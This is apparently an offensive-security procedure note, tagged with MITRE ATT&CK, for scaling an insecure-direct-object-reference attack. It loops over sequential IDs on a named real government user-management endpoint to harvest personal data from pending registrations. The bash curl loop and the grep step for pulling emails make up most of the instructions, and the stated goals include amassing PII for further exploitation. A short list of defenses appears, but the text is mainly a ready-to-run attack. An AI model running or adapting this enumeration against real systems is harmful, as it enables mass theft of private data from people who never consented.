---
tags:
  - idor
  - enumeration
  - pii
  - scaling
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-iterate-ids]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
  - '[[Gather Victim Host Information]]'
updated_at: '2025-12-14T17:32:39.372Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: e07a4797-ccde-444a-83cd-45cd3cfed143
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
  - '[[Gather Victim Host Information]]'
---
# Iterate-IDs-for-Multiple-User-Data-via-IDOR

## Summary

This procedure scales IDOR exploitation by iterating over sequential numeric IDs on the TAMS pendingUserDetails endpoint to harvest PII from multiple unauthorized user registrations.

## Description

Once a valid ID range is identified (e.g., around 2600), attackers can loop through IDs to systematically access data from various pending registrations, amassing a database of emails, addresses, and more without detection.

## Requirements

1. Base URL and endpoint knowledge
2. Scripting capability for iteration (bash loop or Python)
3. Initial valid ID to start enumeration

## Defense

Defensive measures and detection strategies:

- Rate-limit API requests per IP/user
- Implement ID randomization or access logging with anomaly detection
- Use web application firewalls to block sequential ID probing

## Objectives

1. Enumerate and collect PII from multiple users
2. Identify patterns in registration statuses or roles
3. Build a comprehensive dataset for further exploitation

## Instructions

### Step 1: Set Up Iteration Script

**Context**: Create a loop to test multiple IDs efficiently.

**Command** ([[commands/curl-iterate-ids]]):
```bash
for id in {2620..2640}; do
  response=$(curl -s -X GET "https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/$id")
  if [[ $response != *"not found"* ]]; then
    echo "$id: Valid" > user_$id.json
    echo $response >> user_$id.json
  fi
done
```

> Tests IDs 2620-2640, saving valid responses. Expected output: JSON files for hits like 2629, 2628, etc.

### Step 2: Aggregate and Review Data

**Context**: Compile results to analyze the harvested PII.

Use grep or jq to search across files:
```bash
grep -r "email" user_*.json
```

> Lists all emails found. Success if multiple unique PII entries are extracted.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Account Discovery]]
- [[Gather Victim Host Information]]

### Sub-Techniques


## Commands Used

- [[commands/curl-iterate-ids]]

## Tools Used


## Tags

- enumeration
- scaling
- discovery
